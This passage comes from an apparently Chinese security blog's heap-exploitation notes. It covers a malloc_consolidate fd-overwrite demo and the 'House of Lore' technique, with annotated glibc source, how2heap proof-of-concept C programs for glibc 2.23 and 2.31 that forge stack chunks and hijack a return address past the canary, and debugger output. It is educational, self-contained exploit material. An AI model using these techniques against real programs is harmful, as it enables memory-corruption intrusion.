0x7ffff7dd1bd8 (main_arena+184) ◂— ...</span><br><span class="line">... ↓</span><br><span class="line">04:0020│   0x602020 ◂— 0x0</span><br></pre></td></tr></table></figure><h3 id="修改fd"><a href="#修改fd" class="headerlink" title="修改fd"></a>修改fd</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">//0x602000</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x602050</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//防止consolidate时报错</span></span><br><span class="line">    chunk2[<span class="number">1</span>] = <span class="number">0x31</span>; <span class="comment">//fake chunk size 0x30</span></span><br><span class="line">    chunk2[<span class="number">7</span>] = <span class="number">0x21</span>;  <span class="comment">//fake chunk&#x27;s next chunk</span></span><br><span class="line">    chunk2[<span class="number">11</span>] = <span class="number">0x21</span>; <span class="comment">//fake chunk&#x27;s next chunk&#x27;s next chuck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = chunk2;<span class="comment">// modify the fd of chunk1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">5000</span>);<span class="comment">// malloc a  big chunk to trigger malloc consolidate</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果就是chunk2被挂入smallbin</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x30: 0x602070 —▸ 0x7ffff7dd1b98 (main_arena+120) ◂— 0x602070 /* &#x27;p `&#x27; */</span><br><span class="line">0x60: 0x602000 —▸ 0x7ffff7dd1bc8 (main_arena+168) ◂— 0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p chunk2</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (unsigned long *) 0x602070</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Lore</title>
      <link href="/2023/08/03/House-of-Lore/"/>
      <url>/2023/08/03/House-of-Lore/</url>
      
        <content type="html"><![CDATA[<p>关于smallbin(FIFO)利用手法 </p><p>利用条件</p><ul><li>能够控制small bin chunk的bk指针。</li><li>能够控制指定位置target的fd指针。一般来讲target的bk 和 target bk的fd都能可控，因为我们申请target时也需要绕过给bck-&gt;fd !&#x3D; victim检测</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">       hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">       (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">       processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">       anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">        <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">        <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">                <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                <span class="comment">// 细致的检查</span></span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">                <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">                <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们主要利用的就是第二种情况</p><h2 id="how2heap例子"><a href="#how2heap例子" class="headerlink" title="how2heap例子"></a>how2heap例子</h2><h3 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="comment">//假设victim的bk可覆盖</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  <span class="comment">//伪造的堆块，即victim-&gt;bk=stack_buffer_1 可以绕过bck-&gt;fd=victim的检查</span></span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  <span class="comment">//这里因为我们最终申请stack_buffer_1时，也需要检查 stack_buffer_1-&gt;bck-&gt;fd=stack_buffer_1</span></span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="comment">//避免释放vimtim时和topchunk合并</span></span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="comment">//free后会进入unsortbin里</span></span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"><span class="comment">//申请一个unsortbin无法处理的的堆块，使unsortbin里的victim进入smallbin</span></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="comment">//模拟写溢出到victim的bk指针</span></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="comment">//申请一次stack_buffer_1会排到smallbin的下一个申请目标</span></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="comment">//申请到stack_buffer_1</span></span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at 0x168d010</span><br><span class="line">stack_buffer_1 at 0x7ffcb1a6c510</span><br><span class="line">stack_buffer_2 at 0x7ffcb1a6c4f0</span><br><span class="line">Create a fake chunk on the stack</span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list</span><br><span class="line">Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()</span><br><span class="line">Allocated the large chunk on the heap at 0x168d120</span><br><span class="line">Freeing the chunk 0x168d010, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)</span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">fwd: 0x7fec6bd16b78</span></span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">bk: 0x7fec6bd16b78</span></span><br><span class="line"></span><br><span class="line">Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x168d010 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x168d510</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">fwd: 0x7fec6bd16c78</span></span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">bk: 0x7fec6bd16c78</span></span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 = malloc(0x100)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fec6bd16c78</span><br><span class="line"></span><br><span class="line">p4 is 0x7ffcb1a6c520 and should be on the stack!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html">https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html</a></p><p><strong>__builtin_return_address</strong> 返回函数的返回地址</p><p><strong>__builtin_frame_address</strong> 返回当前函数的帧地址即rbp的值</p></blockquote><h3 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h3><p>31的话需要绕过tcache和stash的机制，stash基本原理就是当调用 _int_malloc 时，如果从 smallbin 或者 fastbin 中取出 chunk之后，对应大小的 tcache 没有满，就会把剩下的 bin 放入 tcache 中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span 